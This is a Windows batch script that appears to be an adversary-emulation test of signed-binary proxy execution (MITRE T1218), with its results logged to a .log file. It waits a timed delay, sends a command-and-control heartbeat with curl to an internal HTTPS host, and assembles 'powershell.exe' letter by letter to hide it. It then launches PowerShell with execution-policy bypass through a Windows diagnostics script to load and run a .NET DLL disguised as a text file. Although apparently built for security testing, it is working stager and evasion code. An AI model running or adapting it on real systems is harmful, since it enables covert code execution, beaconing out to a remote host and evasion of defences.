@echo off
SETLOCAL EnableDelayedExpansion

SET txisnba=%APPDATA%\8866\6b457caf
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8866-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=goog1edrive.txt
SET dvhhyc=8866

SET rhmtcq=%APPDATA%\!rrocubc!
SET zxjfkv=macula-simulations.log
SET lyqopb=!rhmtcq!\!zxjfkv!

REM Initial delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start>> "!lyqopb!" 2>nul
SET /A kfgsq=30
timeout /t !kfgsq! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>> "!lyqopb!" 2>nul

REM C2 heartbeat (NOT obfuscated)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!lyqopb!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!lyqopb!" 2>nul

REM Random delay
SET /A hjgkk=!RANDOM! %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_!hjgkk!s_start>> "!lyqopb!" 2>nul
ping -n !hjgkk! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>> "!lyqopb!" 2>nul

REM Obfuscated LOLBin references
SET xcbnlp=p
SET wqmngz=o
SET vcjbmr=w
SET kldsq=e
SET trjqzf=r
SET pczkxb=s
SET nmvrts=h
SET qxjtyr=e
SET wyqjst=l
SET l
SET l
SET l
FOR /F %%i IN ('echo !xcbnlp!!wqmngz!!vcjbmr!!kldsq!!trjqzf!!pczkxb!!nmvrts!!qxjtyr!!wyqjst!') DO SET b1=%%i

SET l
SET l
SET ybmnqs=.
SET l
SET fkjxqe=ex
SET l
SET l
FOR /F %%i IN ('echo !fkjxqe!!ybmnqs!') DO SET b2=%%i

REM Command parts
SET mklpoj=-ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .
SET nqjdfk=\UtilityFunctions.ps1; RegSnapin 
SET phqzgw=\!xzanpex!;[Program.Class]::Dale()""

SET cmdpart1=!mklpoj!!nqjdfk!!txisnba!
SET fullcmd=!cmdpart1!!phqzgw!

REM Execute .NET DLL via obfuscated LOLBin
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: net_exec_start>> "!lyqopb!" 2>nul
SET ttp_result=0
SET ttp_error=

!b1!!b2! !fullcmd!
IF !ERRORLEVEL! EQU 0 (
    SET ttp_result=1
) ELSE (
    SET ttp_error=execution_failed_!ERRORLEVEL!
)

echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!ttp_result!:!ttp_error!>> "!lyqopb!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: net_exec_complete_result_!ttp_result!>> "!lyqopb!" 2>nul

CHOICE /C Y /N /D Y /T 10 >nul